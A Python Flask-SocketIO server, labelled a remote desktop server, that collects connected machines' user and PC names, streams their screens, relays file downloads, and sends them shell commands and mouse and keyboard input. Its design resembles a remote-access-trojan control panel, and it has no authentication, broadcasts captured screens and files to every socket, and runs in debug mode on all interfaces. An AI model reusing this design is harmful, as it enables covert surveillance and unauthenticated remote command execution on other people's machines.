from flask import Flask, render_template, send_from_directory, request
from flask_socketio import SocketIO, emit
import json
import os
import base64
from datetime import datetime
import logging
from collections import defaultdict
import threading
import time

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Armazenamento de clientes conectados
connected_clients = {}
client_sessions = defaultdict(dict)

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.lock = threading.Lock()
    
    def add_client(self, sid, client_info):
        with self.lock:
            self.clients[sid] = {
                'info': client_info,
                'connected_at': datetime.now(),
                'last_frame': None,
                'streaming': False
            }
            logger.info(f"Client {sid} added: {client_info}")
    
    def remove_client(self, sid):
        with self.lock:
            if sid in self.clients:
                del self.clients[sid]
                logger.info(f"Client {sid} removed")
    
    def get_client(self, sid):
        with self.lock:
            return self.clients.get(sid)
    
    def get_all_clients(self):
        with self.lock:
            return dict(self.clients)

client_manager = ClientManager()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

# Eventos Socket.IO para compatibilidade com o cliente

@socketio.on('connect')
def handle_connect(auth):
    sid = request.sid  # Aqui request funciona, pois estamos dentro do contexto Flask
    logger.info(f"Client connected: {sid}")
    emit('connected', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    logger.info(f"Client disconnected: {sid}")
    client_manager.remove_client(sid)


@socketio.on('whoami')
def handle_whoami(data):
    """Recebe informações do cliente (username, pc_name, etc.)"""
    try:
        client_info = json.loads(data) if isinstance(data, str) else data
        client_manager.add_client(request.sid, client_info)
        
        # Broadcast para todos os clientes web sobre novo cliente conectado
        socketio.emit('client_connected', {
        'sid': request.sid,
        'info': client_info
        }, to=None)

        
        logger.info(f"Client info received: {client_info}")
    except Exception as e:
        logger.error(f"Error handling whoami: {e}")

@socketio.on('frame')
def handle_frame(data):
    """Recebe frames de vídeo do cliente"""
    try:
        # Converte bytes para base64 para transmissão web
        if isinstance(data, bytes):
            frame_b64 = base64.b64encode(data).decode('utf-8')
        else:
            frame_b64 = data
        
        client = client_manager.get_client(request.sid)
        if client:
            client['last_frame'] = frame_b64
            client['streaming'] = True
        
        # Broadcast frame para clientes web
        socketio.emit('video_frame', {
            'client_id': request.sid,
            'frame': frame_b64
        }, broadcast=True)
        
    except Exception as e:
        logger.error(f"Error handling frame: {e}")

@socketio.on('record-frame')
def handle_record_frame(data):
    """Recebe frames de gravação do cliente"""
    try:
        if isinstance(data, bytes):
            frame_b64 = base64.b64encode(data).decode('utf-8')
        else:
            frame_b64 = data
        
        # Broadcast frame de gravação para clientes web
        socketio.emit('record_frame', {
            'client_id': request.sid,
            'frame': frame_b64
        }, broadcast=True)
        
    except Exception as e:
        logger.error(f"Error handling record frame: {e}")

@socketio.on('end-record')
def handle_end_record(data):
    """Finaliza gravação"""
    try:
        record_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('recording_ended', {
            'client_id': request.sid,
            'data': record_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling end record: {e}")

@socketio.on('stream-info')
def handle_stream_info(data):
    """Recebe informações sobre o stream"""
    try:
        stream_data = json.loads(data) if isinstance(data, str) else data
        client = client_manager.get_client(request.sid)
        if client:
            client['streaming'] = stream_data.get('data', {}).get('active', False)
        
        socketio.emit('stream_status', {
            'client_id': request.sid,
            'active': stream_data.get('data', {}).get('active', False)
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling stream info: {e}")

@socketio.on('cmd-response')
def handle_cmd_response(data):
    """Recebe resposta de comando do cliente"""
    try:
        cmd_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('command_response', {
            'client_id': request.sid,
            'data': cmd_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling cmd response: {e}")

@socketio.on('cmd_terminal_output')
def handle_terminal_output(data):
    """Recebe saída do terminal"""
    try:
        terminal_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('terminal_output', {
            'client_id': request.sid,
            'data': terminal_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling terminal output: {e}")

@socketio.on('explorer')
def handle_explorer(data):
    """Recebe dados do explorador de arquivos"""
    try:
        explorer_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('file_explorer', {
            'client_id': request.sid,
            'data': explorer_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling explorer: {e}")

@socketio.on('file_chunk')
def handle_file_chunk(data):
    """Recebe chunk de arquivo"""
    try:
        # Converte bytes para base64 se necessário
        if isinstance(data, bytes):
            chunk_b64 = base64.b64encode(data).decode('utf-8')
        else:
            chunk_b64 = data
        
        socketio.emit('file_chunk_received', {
            'client_id': request.sid,
            'chunk': chunk_b64
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling file chunk: {e}")

@socketio.on('file_complete')
def handle_file_complete(data):
    """Arquivo completamente recebido"""
    try:
        file_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('file_download_complete', {
            'client_id': request.sid,
            'data': file_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling file complete: {e}")

@socketio.on('info')
def handle_info(data):
    """Recebe mensagens de informação"""
    try:
        info_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('client_info', {
            'client_id': request.sid,
            'data': info_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling info: {e}")

@socketio.on('err')
def handle_error(data):
    """Recebe mensagens de erro"""
    try:
        error_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('client_error', {
            'client_id': request.sid,
            'data': error_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling error: {e}")

@socketio.on('warn')
def handle_warning(data):
    """Recebe mensagens de aviso"""
    try:
        warn_data = json.loads(data) if isinstance(data, str) else data
        socketio.emit('client_warning', {
            'client_id': request.sid,
            'data': warn_data
        }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling warning: {e}")

# Eventos para controlar o cliente remotamente

@socketio.on('send_command')
def handle_send_command(data):
    """Envia comando para cliente específico"""
    try:
        client_id = data.get('client_id')
        command = data.get('command')
        
        if client_id and command:
            socketio.emit('cmd', json.dumps(command), room=client_id)
            logger.info(f"Command sent to {client_id}: {command}")
    except Exception as e:
        logger.error(f"Error sending command: {e}")

@socketio.on('send_terminal_command')
def handle_send_terminal_command(data):
    """Envia comando de terminal para cliente específico"""
    try:
        client_id = data.get('client_id')
        command = data.get('command')
        
        if client_id and command:
            socketio.emit('cmd_terminal_input', {
                'cmd': command,
                'by': request.sid
            }, room=client_id)
            logger.info(f"Terminal command sent to {client_id}: {command}")
    except Exception as e:
        logger.error(f"Error sending terminal command: {e}")

@socketio.on('control_streaming')
def handle_control_streaming(data):
    """Controla streaming de vídeo"""
    try:
        client_id = data.get('client_id')
        enable = data.get('enable', False)
        
        if client_id:
            command = {
                'class': 'special',
                'type': 'control-feature',
                'data': {
                    'feature': 'frame',
                    'situation': str(enable).lower()
                }
            }
            socketio.emit('cmd', json.dumps(command), room=client_id)
            logger.info(f"Streaming control sent to {client_id}: {enable}")
    except Exception as e:
        logger.error(f"Error controlling streaming: {e}")

@socketio.on('set_frame_delay')
def handle_set_frame_delay(data):
    """Define delay entre frames"""
    try:
        client_id = data.get('client_id')
        delay = data.get('delay', 0.1)
        
        if client_id:
            command = {
                'class': 'special',
                'type': 'control-feature',
                'data': {
                    'feature': 'frame-delay',
                    'delay': str(delay)
                }
            }
            socketio.emit('cmd', json.dumps(command), room=client_id)
            logger.info(f"Frame delay set for {client_id}: {delay}")
    except Exception as e:
        logger.error(f"Error setting frame delay: {e}")

@socketio.on('desktop_control')
def handle_desktop_control(data):
    """Controla desktop remotamente (clique, tecla, scroll)"""
    try:
        client_id = data.get('client_id')
        control_data = data.get('control_data')
        
        if client_id and control_data:
            command = {
                'class': 'special',
                'type': 'control-desktop',
                'data': control_data
            }
            socketio.emit('cmd', json.dumps(command), room=client_id)
            logger.info(f"Desktop control sent to {client_id}: {control_data}")
    except Exception as e:
        logger.error(f"Error with desktop control: {e}")

@socketio.on('file_operation')
def handle_file_operation(data):
    """Operações de arquivo (download, upload, delete)"""
    try:
        client_id = data.get('client_id')
        operation = data.get('operation')
        file_data = data.get('file_data')
        
        if client_id and operation and file_data:
            command = {
                'class': 'special',
                'type': operation,
                'data': file_data,
                'by': request.sid
            }
            socketio.emit('cmd', json.dumps(command), room=client_id)
            logger.info(f"File operation sent to {client_id}: {operation}")
    except Exception as e:
        logger.error(f"Error with file operation: {e}")

@socketio.on('get_directory')
def handle_get_directory(data):
    """Solicita listagem de diretório"""
    try:
        client_id = data.get('client_id')
        directory = data.get('directory')
        is_back = data.get('back', False)
        
        if client_id and directory:
            command = {
                'class': 'special',
                'type': 'updateExpItems',
                'data': {
                    'directory': directory,
                    'back': is_back
                },
                'by': request.sid
            }
            socketio.emit('cmd', json.dumps(command), room=client_id)
            logger.info(f"Directory request sent to {client_id}: {directory}")
    except Exception as e:
        logger.error(f"Error getting directory: {e}")

@socketio.on('get_clients')
def handle_get_clients():
    """Retorna lista de clientes conectados"""
    try:
        clients = client_manager.get_all_clients()
        emit('clients_list', {
            'clients': {sid: client['info'] for sid, client in clients.items()}
        })
    except Exception as e:
        logger.error(f"Error getting clients: {e}")

if __name__ == '__main__':
    # Cria diretórios necessários
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static/css', exist_ok=True)
    os.makedirs('static/js', exist_ok=True)
    
    print("🚀 Remote Desktop Server starting...")
    print("📡 Server will be available at: http://localhost:5000")
    print("🔗 Clients should connect to: ws://localhost:5000")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
